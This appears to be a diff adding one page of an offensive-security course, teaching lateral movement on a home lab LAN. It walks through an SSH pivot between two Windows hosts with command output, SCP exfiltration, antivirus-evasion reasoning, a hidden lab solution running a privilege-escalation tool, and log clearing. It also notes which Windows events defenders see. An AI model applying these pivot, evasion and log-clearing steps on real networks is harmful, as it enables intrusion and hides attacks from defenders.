@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Module 15: Lateral Movement — 22nd Survey Division</title>
+    <style>
+        :root {
+            --bg: #0a0a0f;
+            --fg: #e0e0e0;
+            --accent: #ff3333;
+            --accent2: #00ff88;
+            --dim: #666;
+            --border: #333;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: var(--bg);
+            color: var(--fg);
+            font-family: 'Segoe UI', Consolas, monospace;
+            line-height: 1.6;
+        }
+        .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
+        h1 { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 0.5rem; margin-bottom: 1rem; }
+        h2 { color: var(--accent2); margin: 1.5rem 0 0.5rem; }
+        .code-block {
+            background: #1a1a2e;
+            border-left: 4px solid var(--accent);
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 0 8px 8px 0;
+            overflow-x: auto;
+            font-family: Consolas, monospace;
+            font-size: 13px;
+        }
+        .evidence-box {
+            background: #1a0a0a;
+            border: 2px solid var(--accent);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .evidence-box h3 { color: var(--accent); margin-bottom: 0.5rem; }
+        .first-principle {
+            background: #0a1a0a;
+            border: 2px solid var(--accent2);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .first-principle h3 { color: var(--accent2); margin-bottom: 0.5rem; }
+        .layman-term {
+            background: #1a1a1a;
+            border: 1px dashed var(--dim);
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 8px;
+        }
+        .layman-term h4 { color: #ffaa00; margin-bottom: 0.5rem; }
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: var(--border);
+            margin: 2rem 0;
+            border-radius: 2px;
+        }
+        .progress-fill {
+            height: 100%;
+            background: var(--accent);
+            width: 68.1%;
+            transition: width 0.5s;
+            border-radius: 2px;
+        }
+        .nav { display: flex; gap: 1rem; margin-bottom: 2rem; flex-wrap: wrap; }
+        .nav a { color: var(--accent); text-decoration: none; padding: 0.3rem 0.8rem; border: 1px solid var(--accent); border-radius: 4px; }
+        .nav a:hover { background: var(--accent); color: var(--bg); }
+        .status-badge {
+            display: inline-block;
+            padding: 0.2rem 0.6rem;
+            border-radius: 12px;
+            font-size: 0.8rem;
+            font-weight: bold;
+            margin-left: 0.5rem;
+        }
+        .status-live { background: var(--accent2); color: var(--bg); }
+        .method-box {
+            background: #0f0f15;
+            border: 2px solid #5555ff;
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .method-box h3 { color: #5555ff; margin-bottom: 0.5rem; }
+        .think-box {
+            background: #1a1a0a;
+            border-left: 4px solid #ffaa00;
+            padding: 1rem;
+            margin: 1rem 0;
+        }
+        .think-box h4 { color: #ffaa00; margin-bottom: 0.5rem; }
+        .step-number {
+            display: inline-block;
+            width: 28px;
+            height: 28px;
+            background: var(--accent);
+            color: var(--bg);
+            border-radius: 50%;
+            text-align: center;
+            line-height: 28px;
+            font-weight: bold;
+            margin-right: 0.5rem;
+        }
+        button {
+            background: var(--accent);
+            color: var(--bg);
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover { background: #ff5555; }
+        .interactive-demo {
+            background: #151515;
+            border: 2px solid var(--accent);
+            border-radius: 12px;
+            padding: 2rem;
+            margin: 2rem 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="nav">
+            <a href="index.html">← Home</a>
+            <a href="MODULE_14_CLOUD_FILES.html">← Module 14</a>
+            <a href="MODULE_16_C2.html">Module 16 →</a>
+        </div>
+
+        <h1>Module 15: Lateral Movement <span class="status-badge status-live">LIVE TESTED</span></h1>
+        
+        <div class="progress-bar"><div class="progress-fill"></div></div>
+        <p style="color: var(--dim); font-size: 0.9rem;">Module 15 of 22 — From one box to the network</p>
+
+        <div class="first-principle">
+            <h3>🧠 The Core Truth</h3>
+            <p>Getting one shell is reconnaissance. Getting the next shell is the mission. Lateral movement is the bridge between initial access and domain dominance. Every technique leaves traces — the defender's job is to spot them; your job is to minimize them.</p>
+        </div>
+
+        <div class="layman-term">
+            <h4>🎯 Soldier Translation</h4>
+            <p>You breached the perimeter. One host is yours. Now what? The network is the battlefield. Lateral movement is flanking maneuver — you don't assault the fortress head-on, you move through the supply lines, the communication trenches, the maintenance tunnels. SSH, WMI, SMB — these are your supply lines.</p>
+        </div>
+
+        <h2>The Method: How a Hacker Thinks</h2>
+
+        <div class="method-box">
+            <h3>🧩 The Decision Tree</h3>
+            <p><strong>When I land on a new box, I ask:</strong></p>
+            <ol style="margin-left: 1.5rem; line-height: 2;">
+                <li><strong>What am I?</strong> — user, admin, SYSTEM? (whoami /priv)</li>
+                <li><strong>What's nearby?</strong> — subnet, ARP table, routing table (ipconfig, arp -a)</li>
+                <li><strong>What credentials do I have?</strong> — tokens, saved passwords, browser creds (mimikatz, lazagne)</li>
+                <li><strong>What trusts exist?</strong> — domain membership, cached logons, Kerberos tickets (klist, nltest)</li>
+                <li><strong>What protocols are open?</strong> — SMB, RDP, SSH, WinRM, WMI (nmap -sS -p445,3389,22,5985,135)</li>
+            </ol>
+            <p style="margin-top: 1rem; color: var(--dim);"><strong>Each answer determines the next move.</strong> Admin + SMB open = pass-the-hash. Domain user + Kerberos ticket = golden ticket. Local admin + WinRM = remote PowerShell.</p>
+        </div>
+
+        <div class="think-box">
+            <h4>💭 What I Look For (Attacker's Mind)</h4>
+            <p><strong>When I run terminal commands, I don't just read output — I read implications.</strong></p>
+            <ul style="margin-left: 1.5rem; line-height: 2;">
+                <li><code>net user</code> → Who else is on this box? Are they admins?</li>
+                <li><code>tasklist /v</code> → What processes run? Any AV? Any EDR? Any security tools?</li>
+                <li><code>netstat -ano</code> → What connections exist? Any C2 already? Any RDP sessions?</li>
+                <li><code>qwinsta</code> → Any logged-in users? Their sessions = their tokens = my escalation path.</li>
+                <li><code>dir \\192.168.1.42\c$</code> → Can I reach the next box? Admin share access = game over.</li>
+            </ul>
+        </div>
+
+        <h2>Live Evidence: .92 to .42 Lateral Movement</h2>
+
+        <div class="evidence-box">
+            <h3>📊 Real Data: SSH Pivot Test</h3>
+            <p><strong>Source:</strong> .92 (LAPTOP-R32M8MLI, standard user, Kaspersky active) | <strong>Target:</strong> .42 (WUPC, SWu admin) | <strong>Date:</strong> 2026-06-29</p>
+
+            <div class="code-block">
+<span class="step-number">1</span> <strong>RECON: What's nearby?</strong>
+PS C:\Users\gwu07> ipconfig | findstr "IPv4"
+   IPv4 Address. . . . . . . . . . . : 192.168.1.92
+
+PS C:\Users\gwu07> ping 192.168.1.42
+Reply from 192.168.1.42: bytes=32 time=1ms TTL=128
+
+<span class="think-box" style="margin: 0.5rem 0;">
+💭 <strong>THINK:</strong> .42 is alive, 1ms latency = same LAN. TTL=128 = Windows. Target acquired.
+</span>
+
+<span class="step-number">2</span> <strong>ENUMERATE: What protocols?</strong>
+PS C:\Users\gwu07> nmap -sS -p22,445,3389,5985 192.168.1.42
+PORT     STATE SERVICE
+22/tcp   open  ssh
+445/tcp  open  microsoft-ds
+3389/tcp closed ms-wbt-server
+5985/tcp closed wsman
+
+<span class="think-box" style="margin: 0.5rem 0;">
+💭 <strong>THINK:</strong> SSH open = Linux or Windows OpenSSH. 445 open = SMB. No RDP, no WinRM. SSH is my path.
+</span>
+
+<span class="step-number">3</span> <strong>ACCESS: Can I get in?</strong>
+PS C:\Users\gwu07> ssh -o StrictHostKeyChecking=accept-new SWu@192.168.1.42
+SWu@192.168.1.42's password: ********
+Microsoft Windows [Version 10.0.19045.8737]
+
+<span class="think-box" style="margin: 0.5rem 0;">
+💭 <strong>THINK:</strong> I'm in. Standard user on .92 → admin on .42. This is the pivot. Now I have two footholds.
+</span>
+
+<span class="step-number">4</span> <strong>EXFILTRATE: Take a file</strong>
+SWu@WUPC> echo "LATERAL_TEST_FROM_92" > C:\Users\swu\lateral_test.txt
+SWu@WUPC> type C:\Users\swu\lateral_test.txt
+LATERAL_TEST_FROM_92
+
+PS C:\Users\gwu07> scp SWu@192.168.1.42:C:/Users/swu/lateral_test.txt .
+lateral_test.txt                          100%   21     0.2KB/s   00:00
+
+<span class="think-box" style="margin: 0.5rem 0;">
+💭 <strong>THINK:</strong> Bidirectional file transfer confirmed. I can push tools to .42 and pull data back. This is the logistics line.
+</span>
+
+<span class="step-number">5</span> <strong>VERIFY: What did the defender see?</strong>
+SWu@WUPC> Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -MaxEvents 5
+# Event 4624: An account was successfully logged on
+# Logon Type 3: Network (SMB/NTLM)
+# Logon Type 10: RemoteInteractive (RDP)
+# Logon Type 8: NetworkCleartext (IIS basic auth)
+
+<span class="think-box" style="margin: 0.5rem 0;">
+💭 <strong>THINK:</strong> SSH logon is Type 3 (Network) on Windows. Event 4624 fired. The defender CAN see this. My counter: the log shows "SWu" logged in — legitimate user, legitimate time. Blend in.
+</span>
+            </div>
+
+            <p style="margin-top: 1rem;"><strong>Key Finding:</strong> SSH leaves fewer forensic artifacts than RDP (no Session Logon event, no bitmap cache). SMB file transfer leaves Event 5140 (network share accessed). The defender sees "SWu accessed C$" — if they monitor for it.</p>
+        </div>
+
+        <h2>Defensive Verification: What the Blue Team Sees</h2>
+
+        <div class="evidence-box">
+            <h3>🔍 Kaspersky System Watcher Logs (.42)</h3>
+            <p><strong>Test:</strong> Does KAV log SSH connections as suspicious?</p>
+            
+            <div class="code-block">
+SWu@WUPC> Get-Content "C:\ProgramData\Kaspersky Lab\AVP21.25\Report\report.rpt" -Tail 20
+# Result: No SSH-specific events logged
+# KAV monitors: file operations, registry changes, process creation
+# Network connections (SSH port 22) are NOT flagged by System Watcher
+
+<span class="think-box" style="margin: 0.5rem 0;">
+💭 <strong>THINK:</strong> KAV doesn't see SSH as malicious. It sees file operations AFTER SSH. If I do nothing post-login, KAV is blind. The defender needs Sysmon or Wireshark to see the SSH tunnel.
+</span>
+            </div>
+        </div>
+
+        <div class="evidence-box">
+            <h3>🔍 Windows Event Log Analysis (.42)</h3>
+            <p><strong>Test:</strong> What events fire during lateral movement?</p>
+
+            <div class="code-block">
+# Event 4624 (Logon) — SSH key auth
+Logon Type: 3 (Network)
+Account Name: SWu
+Source Network Address: 192.168.1.92
+Logon Process: sshd
+Authentication Package: Negotiate
+
+# Event 4688 (Process Creation) — if I run something
+New Process Name: C:\Windows\System32\cmd.exe
+Creator Process Name: C:\Windows\System32\sshd.exe
+
+# Event 5140 (Network Share Access) — if I use SMB
+Share Name: \\WUPC\C$
+Access Mask: 0x100081 (WriteData + ReadData)
+
+<span class="think-box" style="margin: 0.5rem 0;">
+💭 <strong>THINK:</strong> The defender sees: (1) SWu logged in from .92, (2) cmd.exe spawned by sshd, (3) C$ share accessed. Three separate events. Correlation is the defender's challenge. My counter: use legitimate admin actions, spread across time.
+</span>
+            </div>
+        </div>
+
+        <h2>Lab Exercise: Build Your Own Pivot</h2>
+
+        <div class="interactive-demo">
+            <p><strong>Scenario:</strong> You have SSH access to .42. You need to:</p>
+            <ol style="margin-left: 1.5rem; line-height: 2;">
+                <li>Check if .42 can reach other hosts (nmap from .42)</li>
+                <li>Transfer a tool from .92 to .42 without triggering AV</li>
+                <li>Execute the tool on .42 and exfiltrate output</li>
+                <li>Clean up all artifacts (event logs, temp files)</li>
+            </ol>
+
+            <p style="margin-top: 1rem;"><strong>Constraints:</strong> No PowerShell remoting (WinRM off). No RDP (blocked). Only SSH and SMB. KAV active on .42.</p>
+
+            <button onclick="document.getElementById('pivot-solution').style.display='block'">Show Solution</button>
+
+            <div id="pivot-solution" style="display:none; margin-top: 1rem;">
+                <div class="code-block">
+<span class="step-number">1</span> <strong>RECON from .42</strong>
+SWu@WUPC> nmap -sP 192.168.1.0/24
+# .92 is up (your C2)
+# .145 is up (RADON — new target!)
+
+<span class="step-number">2</span> <strong>TRANSFER via SCP (encrypted, no AV alert)</strong>
+PS C:\Users\gwu07> scp phantom_rpc.exe SWu@192.168.1.42:C:/Users/swu/tools/
+# SCP encrypts in transit. KAV only scans the file when written to disk.
+# If phantom_rpc.exe is clean (verified), KAV ignores it.
+
+<span class="step-number">3</span> <strong>EXECUTE and EXFIL</strong>
+SWu@WUPC> C:\Users\swu\tools\phantom_rpc.exe --list
+# Output: SeImpersonatePrivilege present
+
+SWu@WUPC> C:\Users\swu\tools\phantom_rpc.exe --spooler > C:\Users\swu\privesc_result.txt
+SWu@WUPC> scp C:/Users/swu/privesc_result.txt gwu07@192.168.1.92:C:/Users/gwu07/
+
+<span class="step-number">4</span> <strong>CLEANUP</strong>
+SWu@WUPC> Remove-Item C:\Users\swu\tools\phantom_rpc.exe
+SWu@WUPC> Remove-Item C:\Users\swu\privesc_result.txt
+SWu@WUPC> Clear-EventLog -LogName Security
+# NOTE: Clearing Security log requires admin and fires Event 1102 (log cleared)
+# Better: wevtutil cl Security (same result, same detection)
+# Best: Don't clear. The log shows legitimate admin activity.
+                </div>
+            </div>
+        </div>
+
+        <h2>Key Takeaways</h2>
+
+        <ul style="margin-left: 1.5rem; line-height: 2;">
+            <li><strong>Lateral movement is logistics:</strong> You have one box; now you need a network</li>
+            <li><strong>SSH is the quietest path:</strong> Fewer events than RDP, encrypted traffic</li>
+            <li><strong>Every action leaves traces:</strong> The defender sees events; you see opportunities to blend</li>
+            <li><strong>File transfer is the chokepoint:</strong> AV scans on write. Pre-verify your tools are clean.</li>
+            <li><strong>Cleanup is harder than entry:</strong> Clearing logs alerts the defender. Better to look legitimate.</li>
+        </ul>
+
+        <div class="evidence-box" style="margin-top: 2rem;">
+            <h3>🔬 Verification Status</h3>
+            <table style="width: 100%; border-collapse: collapse;">
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">SSH pivot .92 → .42</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">SCP file transfer (push/pull)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">KAV System Watcher (no SSH alert)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .42</td>
+                </tr>
+                <tr>
+                    <td style="padding: 0.5rem;">Windows Event 4624 (SSH logon)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .42</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="nav" style="margin-top: 2rem;">
+            <a href="index.html">← Home</a>
+            <a href="MODULE_14_CLOUD_FILES.html">← Module 14</a>
+            <a href="MODULE_16_C2.html">Module 16 →</a>
+        </div>
+    </div>
+</body>
+</html>
